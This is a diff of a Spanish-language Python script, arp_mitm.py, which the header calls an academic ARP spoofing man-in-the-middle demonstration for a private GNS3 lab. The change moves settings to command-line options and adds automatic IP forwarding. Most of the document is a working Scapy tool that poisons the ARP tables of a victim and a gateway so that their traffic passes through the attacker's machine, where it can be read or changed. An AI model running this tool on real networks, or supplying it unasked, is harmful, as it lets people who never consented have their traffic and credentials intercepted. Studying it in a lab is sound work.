@@ -3,99 +3,123 @@
 arp_mitm.py
 -----------
 Demostracion academica de un ataque Man-in-the-Middle (MitM) mediante
-ARP Spoofing / ARP Poisoning. USO EXCLUSIVO EN LABORATORIO PROPIO.
+ARP Spoofing. USO EXCLUSIVO EN LABORATORIO PROPIO (GNS3).
 
 Objetivo del script:
-    Envenenar las tablas ARP de dos hosts (o de un host y el gateway) para
-    que todo el trafico entre ellos atraviese el equipo atacante, permitiendo
-    su intercepcion y/o manipulacion.
+    Envenenar las tablas ARP de dos hosts para que todo el trafico
+    entre ellos atraviese el equipo atacante, permitiendo su
+    intercepcion y/o manipulacion.
 
-Parametros usados (variables de configuracion mas abajo):
-    VICTIM_A : IP de la primera victima.
-    VICTIM_B : IP de la segunda victima (o gateway).
-    IFACE    : Interfaz de red del atacante.
-    INTERVAL : Segundos entre cada reenvio de BPDUs ARP falsificadas.
+Parametros:
+    -v / --victim   : IP de la victima  (requerido)
+    -g / --gateway  : IP del gateway    (requerido)
+    -i / --iface    : Interfaz de red   (default: eth0)
+    --interval      : Segundos entre reenvios ARP (default: 2)
 
 Requisitos:
-    - Linux con privilegios de root (sudo).
+    - Linux con privilegios de root (sudo)
     - Python 3.8+
-    - Scapy:  pip install scapy
-    - IP forwarding habilitado para reenviar el trafico:
-          sudo sysctl -w net.ipv4.ip_forward=1
-    - Las tres maquinas en el mismo dominio de broadcast (misma VLAN/LAN).
+    - pip install scapy
+    - Las maquinas en el mismo dominio de broadcast (misma VLAN)
+    - IP forwarding: el script lo habilita automaticamente
 
-Ejecucion:
-    sudo python3 arp_mitm.py
+Uso:
+    sudo python3 arp_mitm.py -v 20.23.3.11 -g 20.23.3.1
+    sudo python3 arp_mitm.py -v 20.23.3.11 -g 20.23.3.1 -i eth0 --interval 1.0
     Ctrl+C para detener y restaurar las tablas ARP legitimas.
 """
 
 import sys
 import time
+import argparse
 from scapy.all import ARP, Ether, send, srp
 
-# ------------------- CONFIGURACION (ajustar al laboratorio) -------------------
-VICTIM_A = "20.23.3.20"     # Host victima 1 (VLAN 10 - Ventas)
-VICTIM_B = "20.23.3.1"      # Gateway de la VLAN 10 (router)
-IFACE    = "eth0"           # Interfaz del atacante
-INTERVAL = 2                # Segundos entre reenvios
-# ------------------------------------------------------------------------------
+
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="ARP MitM - Laboratorio GNS3 (uso academico)"
+    )
+    parser.add_argument("-v", "--victim",  required=True, help="IP de la victima (ej: 20.23.3.11)")
+    parser.add_argument("-g", "--gateway", required=True, help="IP del gateway (ej: 20.23.3.1)")
+    parser.add_argument("-i", "--iface",   default="eth0", help="Interfaz de red (default: eth0)")
+    parser.add_argument("--interval",      type=float, default=2.0, help="Segundos entre reenvios ARP (default: 2)")
+    return parser.parse_args()
 
 
-def get_mac(ip):
-    """Resuelve la MAC de una IP enviando una solicitud ARP por broadcast."""
+def get_mac(ip, iface):
+    """Resuelve la MAC de una IP via ARP request broadcast."""
     ans, _ = srp(
         Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
-        timeout=2, iface=IFACE, verbose=0,
+        timeout=3, iface=iface, verbose=0,
     )
     for _, resp in ans:
         return resp.hwsrc
     return None
 
 
-def spoof(target_ip, target_mac, spoof_ip):
-    """
-    Envia una respuesta ARP no solicitada (op=2) diciendole a target_ip
-    que spoof_ip se encuentra en la MAC del atacante (la de IFACE).
-    """
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    send(packet, iface=IFACE, verbose=0)
+def spoof(target_ip, target_mac, spoof_ip, iface):
+    """Envia ARP reply falso: le dice a target_ip que spoof_ip = MAC atacante."""
+    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip), iface=iface, verbose=0)
 
 
-def restore(ip1, mac1, ip2, mac2):
-    """Repara las tablas ARP de ambas victimas con la informacion correcta."""
-    send(ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2),
-         count=5, iface=IFACE, verbose=0)
-    send(ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1),
-         count=5, iface=IFACE, verbose=0)
+def restore(ip1, mac1, ip2, mac2, iface):
+    """Restaura las tablas ARP con la informacion legitima."""
+    send(ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2), count=5, iface=iface, verbose=0)
+    send(ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1), count=5, iface=iface, verbose=0)
+
+
+def enable_forwarding():
+    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+        f.write("1")
+
+
+def disable_forwarding():
+    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+        f.write("0")
 
 
 def main():
-    print("[*] Resolviendo direcciones MAC de las victimas...")
-    mac_a = get_mac(VICTIM_A)
-    mac_b = get_mac(VICTIM_B)
+    args = parse_args()
 
-    if not mac_a or not mac_b:
-        print("[!] No se pudieron resolver las MAC. Verifica conectividad/VLAN.")
+    print("=" * 60)
+    print("  ARP MitM ATTACK - Laboratorio GNS3")
+    print(f"  Victima: {args.victim} | Gateway: {args.gateway}")
+    print(f"  Interfaz: {args.iface} | Intervalo: {args.interval}s")
+    print("=" * 60)
+
+    print("\n[*] Resolviendo MACs...")
+    mac_victim  = get_mac(args.victim,  args.iface)
+    mac_gateway = get_mac(args.gateway, args.iface)
+
+    if not mac_victim:
+        print(f"[!] No se pudo resolver la MAC de la victima {args.victim}")
+        print("    Verifica que la VPCS haya obtenido IP por DHCP y que haga ping al gateway.")
+        sys.exit(1)
+    if not mac_gateway:
+        print(f"[!] No se pudo resolver la MAC del gateway {args.gateway}")
         sys.exit(1)
 
-    print(f"[+] Victima A  {VICTIM_A}  ->  {mac_a}")
-    print(f"[+] Victima B  {VICTIM_B}  ->  {mac_b}")
-    print("[*] Verifica que el IP forwarding este activo:")
-    print("    sudo sysctl -w net.ipv4.ip_forward=1")
-    print("[*] Envenenando cache ARP... (Ctrl+C para detener y restaurar)")
+    print(f"    MAC Victima : {mac_victim}")
+    print(f"    MAC Gateway : {mac_gateway}")
+
+    enable_forwarding()
+    print("[*] IP Forwarding habilitado.")
+    print("[*] Envenenando tablas ARP... (Ctrl+C para detener)\n")
 
     sent = 0
     try:
         while True:
-            spoof(VICTIM_A, mac_a, VICTIM_B)   # A cree que el atacante es B
-            spoof(VICTIM_B, mac_b, VICTIM_A)   # B cree que el atacante es A
+            spoof(args.victim,  mac_victim,  args.gateway, args.iface)
+            spoof(args.gateway, mac_gateway, args.victim,  args.iface)
             sent += 2
-            print(f"\r[+] Paquetes ARP enviados: {sent}", end="")
-            time.sleep(INTERVAL)
+            print(f"\r    [+] Paquetes ARP enviados: {sent}", end="", flush=True)
+            time.sleep(args.interval)
+
     except KeyboardInterrupt:
-        print("\n[*] Restaurando tablas ARP legitimas...")
-        restore(VICTIM_A, mac_a, VICTIM_B, mac_b)
-        print("[+] Tablas restauradas. Ataque finalizado.")
+        print("\n\n[!] Restaurando tablas ARP...")
+        restore(args.victim, mac_victim, args.gateway, mac_gateway, args.iface)
+        disable_forwarding()
+        print("[+] Tablas ARP restauradas. IP Forwarding deshabilitado.")
 
 
 if __name__ == "__main__":
